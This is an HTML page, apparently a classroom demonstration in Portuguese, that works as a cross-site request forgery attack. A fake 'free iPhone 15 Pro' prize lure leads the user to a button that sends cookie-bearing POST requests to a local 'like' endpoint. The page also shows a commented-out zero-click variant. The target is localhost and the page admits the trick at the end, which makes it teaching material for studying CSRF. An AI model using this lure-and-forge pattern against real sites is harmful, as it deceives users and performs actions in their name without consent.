<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>üéÅ Ganhe um iPhone 15 Pro GR√ÅTIS!</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }

    .container {
      text-align: center;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      max-width: 500px;
    }

    h1 {
      font-size: 2.5em;
      margin: 0 0 20px 0;
    }

    p {
      font-size: 1.2em;
      margin: 20px 0;
    }

    .btn {
      background: #ff6b6b;
      color: white;
      border: none;
      padding: 15px 40px;
      font-size: 1.2em;
      border-radius: 50px;
      cursor: pointer;
      transition: transform 0.2s;
    }

    .btn:hover {
      transform: scale(1.05);
    }

    .fake-loader {
      display: none;
      margin-top: 20px;
    }

    .fake-loader.active {
      display: block;
    }

    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 4px solid white;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    .debug {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: rgba(0, 0, 0, 0.8);
      color: #00ff00;
      padding: 15px;
      border-radius: 8px;
      font-family: monospace;
      font-size: 12px;
      max-width: 300px;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>üéÅ Parab√©ns!</h1>
    <p>
      Voc√™ foi selecionado para ganhar um
      <strong>iPhone 15 Pro</strong> GR√ÅTIS!
    </p>
    <p>Clique no bot√£o abaixo para reivindicar seu pr√™mio:</p>
    <button class="btn" onclick="claim()">üéâ RESGATAR AGORA</button>

    <div class="fake-loader" id="loader">
      <div class="spinner"></div>
      <p>Processando seu pr√™mio...</p>
    </div>
  </div>

  <!-- ‚ö†Ô∏è ATAQUE CSRF: Iframes escondidos que disparam likes -->
  <!-- Cada iframe faz um request para dar like em um post diferente -->
  <iframe id="csrf1" style="display: none"></iframe>
  <iframe id="csrf2" style="display: none"></iframe>
  <iframe id="csrf3" style="display: none"></iframe>
  <iframe id="csrf4" style="display: none"></iframe>
  <iframe id="csrf5" style="display: none"></iframe>

  <!-- Debug console para demonstra√ß√£o -->
  <div class="debug" id="debug">
    <strong>üîç Debug Console (Demo):</strong><br />
    <div id="log"></div>
  </div>

  <script>
    // ‚ö†Ô∏è CONFIGURA√á√ÉO DO ATAQUE
    const TARGET_URL = "http://localhost:3000";

    // IDs dos posts para dar like (ajuste conforme seu banco)
    const POST_IDS = [12, 11, 10, 9, 2, 3, 4, 5];

    // Fun√ß√£o de log para demonstra√ß√£o
    function log(message) {
      const logDiv = document.getElementById("log");
      const timestamp = new Date().toLocaleTimeString();
      logDiv.innerHTML += `<br>[${timestamp}] ${message}`;
      logDiv.scrollTop = logDiv.scrollHeight;
    }

    // Fun√ß√£o que o usu√°rio clica (falso bot√£o de pr√™mio)
    function claim() {
      document.getElementById("loader").classList.add("active");
      log("üéØ Usu√°rio clicou no bot√£o...");

      // Disparar ataques CSRF
      executeCSRFAttack();
    }

    // ‚ö†Ô∏è ATAQUE CSRF: Dispara likes autom√°ticos
    function executeCSRFAttack() {
      log("‚ö†Ô∏è Iniciando ataque CSRF...");

      POST_IDS.forEach((postId, index) => {
        setTimeout(() => {
          // ‚úÖ Usar fetch em vez de form (mais moderno e confi√°vel)
          fetch(`${TARGET_URL}/api/like`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            credentials: "include", // ‚ö†Ô∏è Envia cookies automaticamente!
            body: JSON.stringify({ postId: postId }),
          })
            .then((response) => response.json())
            .then((data) => {
              if (data.success) {
                log(`‚úÖ Like enviado para Post #${postId} - SUCESSO!`);
              } else {
                log(
                  `‚ö†Ô∏è Like para Post #${postId} - Falhou: ${data.error || "Erro desconhecido"
                  }`
                );
              }
            })
            .catch((error) => {
              log(`‚ùå Erro no Post #${postId}: ${error.message}`);
            });

          // Feedback visual no √∫ltimo
          if (index === POST_IDS.length - 1) {
            setTimeout(() => {
              log("‚úÖ Ataque completo!");
              log("ü§ñ 5 likes foram disparados automaticamente");
              log("üç™ Cookies do usu√°rio foram enviados");
              log("‚ö†Ô∏è Usu√°rio nem percebeu o ataque!");

              // Mostrar "sucesso" falso
              document.querySelector(".container").innerHTML = `
                  <h1>‚úÖ Pr√™mio Confirmado!</h1>
                  <p>Seu iPhone ser√° enviado em at√© 30 dias...</p>
                  <p><small>(Obviamente isso √© falso - voc√™ foi atacado por CSRF!)</small></p>
                  <p style="margin-top: 20px; font-size: 0.9em;">
                    <strong>Volte para o Code Connect e recarregue a p√°gina para ver os likes aumentarem! üëç</strong>
                  </p>
                `;
            }, 3000);
          }
        }, index * 500); // Espa√ßar os requests
      });
    }

    // ‚ö†Ô∏è VARIANTE ZERO-CLICK: Ataque autom√°tico ao carregar a p√°gina
    // Descomente a linha abaixo para ataque sem intera√ß√£o do usu√°rio
    // window.onload = () => { executeCSRFAttack(); };

    // Log inicial
    log("üåê P√°gina maliciosa carregada");
    log("‚è≥ Aguardando usu√°rio clicar...");
  </script>
</body>

</html>